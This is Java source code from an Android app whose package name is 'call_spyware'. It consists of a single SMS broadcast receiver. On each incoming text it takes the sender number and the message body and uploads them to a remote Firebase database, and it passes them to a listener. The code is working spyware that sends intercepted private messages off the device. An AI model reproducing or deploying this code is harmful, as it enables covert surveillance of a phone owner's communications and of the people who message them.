package com.ngpmbewetu.call_spyware;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class SMS_receiver extends BroadcastReceiver {
    private static MessageListener mListener;
    DatabaseReference reff;
    MessageInfo message_info;
    @Override
    public void onReceive(Context context, Intent intent) {
        reff= FirebaseDatabase.getInstance().getReference().child("MessageInfo");

        message_info=new MessageInfo();

        Bundle data = intent.getExtras();
        Object[] pdus = (Object[]) data.get("pdus");

        final SmsMessage[] smsMessage = new SmsMessage[pdus.length];

        for(int i=0; i<pdus.length; i++){
            smsMessage[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);

        }
        StringBuffer content = new StringBuffer();
        if (smsMessage.length > 0) {
            for (int i = 0; i < smsMessage.length; i++) {
                content.append(smsMessage[i].getMessageBody());

                String body= smsMessage[i].getMessageBody();
                String sender=smsMessage[i].getDisplayOriginatingAddress();
                String displayBody=smsMessage[i].getDisplayMessageBody();

                message_info.setSender(sender);
                message_info.set_displayBody(displayBody);
                Toast.makeText(context, "sender= "+sender, Toast.LENGTH_SHORT).show();
                Toast.makeText(context, "body= "+body, Toast.LENGTH_SHORT).show();
                reff.push().setValue(message_info);
                Toast.makeText(context, "data inserted succesfully", Toast.LENGTH_SHORT).show();
                mListener.originatingNumber(sender);
                mListener.DisplayMessagebody(displayBody);
            }
        }
        String mySmsText = content.toString();
        mListener.messageReceived(mySmsText);

    }

    public static void bindListener(MessageListener listener){
        mListener = listener;
    }
}
